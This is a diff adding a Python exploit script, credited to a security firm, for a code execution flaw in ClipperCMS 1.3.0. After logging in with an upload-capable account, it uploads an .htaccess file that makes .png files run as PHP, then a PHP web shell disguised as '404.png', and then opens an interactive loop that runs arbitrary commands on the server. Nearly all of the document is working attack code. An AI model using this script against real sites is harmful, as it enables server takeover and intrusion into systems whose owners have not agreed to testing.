@@ -1,0 +1,81 @@
+#!/usr/local/bin/python
+# Exploit for ClipperCMS 1.3.0 Code Execution vulnerability
+# An account is required with rights to file upload (eg a user in the Admin, Publisher, or Editor role)
+# The server must parse htaccess files for this exploit to work.
+# Curesec GmbH crt@curesec.com
+
+import sys
+import re
+import requests # requires requests lib
+
+if len(sys.argv) != 4:
+    exit("usage: python " + sys.argv[0] + " http://example.com/ClipperCMS/ admin admin")
+
+url = sys.argv[1]
+username = sys.argv[2]
+password = sys.argv[3]
+
+loginPath = "/manager/processors/login.processor.php"
+fileManagerPath = "/manager/index.php?a=31"
+
+def login(requestSession, url, username, password):
+    postData = {"ajax": "1", "username": username, "password": password}
+    return requestSession.post(url, data = postData, headers = {"referer": url})
+
+def getFullPath(requestSession, url):
+    request = requestSession.get(url, headers = {"referer": url})
+    if "You don't have enough privileges" in request.text:
+        return "cant upload"
+    fullPath = re.search("var current_path = '(.*)';", request.text)
+    return fullPath.group(1)
+
+def upload(requestSession, url, fileName, fileContent, postData):
+    filesData = {"userfile[0]": (fileName, fileContent)}
+    return requestSession.post(url, files = filesData, data = postData, headers = {"referer": url})
+
+def workingShell(url, fullPath):
+    return fullPath.strip("/") in requests.get(url + "pwd", headers = {"referer": url}).text.strip("/")
+
+def runShell(url):
+    print("enter command, or enter exit to quit.")
+    command = raw_input("$ ")
+    while "exit" not in command:
+        print(requests.get(url + command).text)
+        command = raw_input("$ ")
+
+requestSession = requests.session()
+
+loginResult = login(requestSession, url + loginPath, username, password)
+if "Incorrect username" in loginResult.text:
+    exit("ERROR: Incorrect username or password")
+else:
+    print("successful: login as " + username)
+
+fullPath = getFullPath(requestSession, url + fileManagerPath)
+if fullPath == "cant upload":
+    exit("ERROR: user does not have required privileges")
+else:
+    print("successful: user is allowed to use file manager. Full path: " + fullPath)
+
+uploadResult = upload(requestSession, url + fileManagerPath, ".htaccess", "AddType application/x-httpd-php .png", {"path": fullPath})
+if "File uploaded successfully" not in uploadResult.text:
+    exit("ERROR: could not upload .htaccess file")
+else:
+    print("successful: .htaccess upload")
+
+uploadResult = upload(requestSession, url + fileManagerPath, "404.png", "<?php passthru($_GET['x']) ?>", {"path": fullPath})
+if "File uploaded successfully" not in uploadResult.text:
+    exit("ERROR: could not upload shell")
+else:
+    print("successful: shell upload. Execute commands via " + url + "404.png?x=<COMMAND>")
+
+if workingShell(url + "404.png?x=", fullPath):
+    print("successful: shell seems to be working")
+else:
+    exit("ERROR: shell does not seem to be working correctly")
+
+runShell(url + "404.png?x=")
+
+
+#Blog Reference:
+#http://blog.curesec.com/article/blog/ClipperCMS-130-Code-Execution-Exploit-96.html
